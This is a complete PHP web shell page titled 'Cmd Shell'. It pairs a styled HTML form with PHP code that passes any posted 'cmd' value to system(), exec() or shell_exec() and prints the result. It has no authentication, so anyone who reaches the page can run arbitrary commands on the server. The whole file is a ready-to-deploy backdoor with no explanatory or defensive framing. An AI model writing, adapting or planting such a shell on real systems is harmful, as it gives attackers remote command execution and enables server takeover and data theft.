<html>
<head>
<style>
body{background-color:black;
color: green;
text-align:center;
font-weight:bold;
font-size:30px;
}
input{background-color: grey;
color: red;
font-size:20px;
font-weight:bold;
border-radius:6px;
height:28px;
width:50%;
}
input.sub{
width:15%;
color:blue;
}
h1{color:red;
font-size:40px;
font-weight:bold;
}
</style>
<title>cmd Shell</title>

</head>
<body>
<br/>
<br/>
<h1>Cmd Shell</h1>
<br/>
<form action="" method="post">
<input type="text" name="cmd" value="ls"/>
<input type="submit" class="sub" name="submit" value="Execute"/>
</form>
<br/>
</body>
</html>
<?php
if (isset($_POST['submit'])){
	$command=$_POST['cmd'];
if(function_exists('system')) {
    system($command, $out);
    echo $out;
  } elseif(function_exists('exec')) {
    echo exec($command);
  } elseif(function_exists('shell_exec')) {
    $output = shell_exec($command);
    echo $output;
  } else {
    echo "<pre>**Terminal Not Accessable**</pre>";
  }}
?>